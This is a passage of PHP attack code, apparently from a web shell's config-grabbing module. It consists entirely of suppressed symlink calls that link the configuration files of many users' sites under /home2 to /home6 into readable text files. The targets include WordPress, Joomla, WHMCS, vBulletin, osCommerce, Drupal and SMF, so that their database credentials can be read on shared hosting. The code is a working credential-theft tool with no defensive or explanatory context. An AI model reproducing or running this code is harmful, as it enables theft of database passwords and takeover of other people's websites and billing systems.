@symlink('/home2/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/connection.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home3/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home3/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home3/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home3/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home3/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home3/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home3/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home3/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home3/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home3/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home3/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home3/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home3/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home3/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home3/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home3/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home3/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home3/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home3/' . $user . '/public_html/home3/wp-config.php', $user . '-wp-home3.txt');
@symlink('/home3/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home3/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home3/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home3/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home3/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home3/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home3/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home3/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home3/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home3/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home3/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home3/' . $user . '/public_html/home3/configuration.php', $user . '-joomla-home3.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home3/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home3/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home3/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home3/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home3/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home3/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home3/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home3/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home3/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home3/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home3/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home3/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home3/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home3/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home3/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home3/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home3/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home3/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home3/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home3/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home3/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home3/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home3/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home3/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home3/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home3/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home3/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home3/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/connection.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home4/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home4/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home4/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home4/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home4/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home4/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home4/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home4/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home4/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home4/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home4/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home4/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home4/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home4/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home4/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home4/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home4/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home4/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home4/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home4/' . $user . '/public_html/home4/wp-config.php', $user . '-wp-home4.txt');
@symlink('/home4/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home4/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home4/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home4/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home4/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home4/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home4/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home4/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home4/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home4/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home4/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home4/' . $user . '/public_html/home4/configuration.php', $user . '-joomla-home4.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home4/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home4/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home4/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home4/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home4/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home4/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home4/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home4/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home4/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home4/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home4/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home4/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home4/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home4/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home4/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home4/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home4/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home4/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home4/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home4/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home4/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home4/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home4/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home4/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home4/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home4/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home4/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home4/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/connection.php', $user . '-normal');
@symlink('/home5/' . $user . '/public_html/inc/config.php', $user . '-MyBB.txt');
@symlink('/home5/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home5/' . $user . '/public_html/includes/configure.php', $user . '-Oscommerce.txt');
@symlink('/home5/' . $user . '/public_html/lib/config.php', $user . '-Balitbang.txt');
@symlink('/home5/' . $user . '/public_html/config/koneksi.php', $user . '-Lokomedia.txt');
@symlink('/home5/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
@symlink('/home5/' . $user . '/public_html/includes/config.php', $user . '-vBulletin2.txt');
@symlink('/home5/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
@symlink('/home5/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
@symlink('/home5/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
@symlink('/home5/' . $user . '/public_html/forum/includes/config.php', $user . '-Phpbb2.txt');
@symlink('/home5/' . $user . '/public_html/wp-config.php', $user . '-Wordpress1.txt');
@symlink('/home5/' . $user . '/public_html/blog/wp-config.php', $user . '-Wordpress2.txt');
@symlink('/home5/' . $user . '/public_html/wp/wp-config.php', $user . '-Wordpress3.txt');
@symlink('/home5/' . $user . '/public_html/home/wp-config.php', $user . '-Wordpress4.txt');
@symlink('/home5/' . $user . '/public_html/main/wp-config.php', $user . '-Wordpress5.txt');
@symlink('/home5/' . $user . '/public_html/site/wp-config.php', $user . '-Wordpress6.txt');
@symlink('/home5/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
@symlink('/home5/' . $user . '/public_html/blog/configuration.php', $user . '-Joomla2.txt');
@symlink('/home5/' . $user . '/public_html/joomla/configuration.php', $user . '-Joomla3.txt');
@symlink('/home5/' . $user . '/public_html/main/configuration.php', $user . '-Joomla4.txt');
@symlink('/home5/' . $user . '/public_html/home/configuration.php', $user . '-Joomla5.txt');
@symlink('/home5/' . $user . '/public_html/site/configuration.php', $user . '-Joomla6.txt');
@symlink('/home5/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
@symlink('/home5/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
@symlink('/home5/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
@symlink('/home5/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
@symlink('/home5/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
@symlink('/home5/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
@symlink('/home5/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
@symlink('/home5/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
@symlink('/home5/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
@symlink('/home5/' . $user . '/public_html/admin/conf.php', $user . '-Other1.txt');
@symlink('/home5/' . $user . '/public_html/admin/config.php', $user . '-Other2.txt');
@symlink('/home5/' . $user . '/public_html/conf_global.php', $user . '-invisio.txt');
@symlink('/home5/' . $user . '/public_html/include/db.php', $user . '-Other3.txt');
@symlink('/home5/' . $user . '/public_html/connect.php', $user . '-Other4.txt');
@symlink('/home5/' . $user . '/public_html/mk_conf.php', $user . '-mk-portale1.txt');
@symlink('/home5/' . $user . '/public_html/include/config.php', $user . '-Other5.txt');
@symlink('/home5/' . $user . '/public_html/settings.php', $user . '-Smf.txt');
@symlink('/home5/' . $user . '/public_html/includes/functions.php', $user . '-phpbb3.txt');
@symlink('/home5/' . $user . '/public_html/include/db.php', $user . '-infinity.txt');
@symlink('/home6/' . $user . '/public_html/inc/config.php', $user . '-MyBB.txt');
@symlink('/home6/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home6/' . $user . '/public_html/includes/configure.php', $user . '-Oscommerce.txt');
@symlink('/home6/' . $user . '/public_html/lib/config.php', $user . '-Balitbang.txt');
@symlink('/home6/' . $user . '/public_html/config/koneksi.php', $user . '-Lokomedia.txt');
@symlink('/home6/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
@symlink('/home6/' . $user . '/public_html/includes/config.php', $user . '-vBulletin2.txt');
@symlink('/home6/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
@symlink('/home6/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
@symlink('/home6/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
@symlink('/home6/' . $user . '/public_html/forum/includes/config.php', $user . '-Phpbb2.txt');
@symlink('/home6/' . $user . '/public_html/wp-config.php', $user . '-Wordpress1.txt');
@symlink('/home6/' . $user . '/public_html/blog/wp-config.php', $user . '-Wordpress2.txt');
@symlink('/home6/' . $user . '/public_html/wp/wp-config.php', $user . '-Wordpress3.txt');
@symlink('/home6/' . $user . '/public_html/home/wp-config.php', $user . '-Wordpress4.txt');
@symlink('/home6/' . $user . '/public_html/main/wp-config.php', $user . '-Wordpress5.txt');
@symlink('/home6/' . $user . '/public_html/site/wp-config.php', $user . '-Wordpress6.txt');
@symlink('/home6/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
@symlink('/home6/' . $user . '/public_html/blog/configuration.php', $user . '-Joomla2.txt');
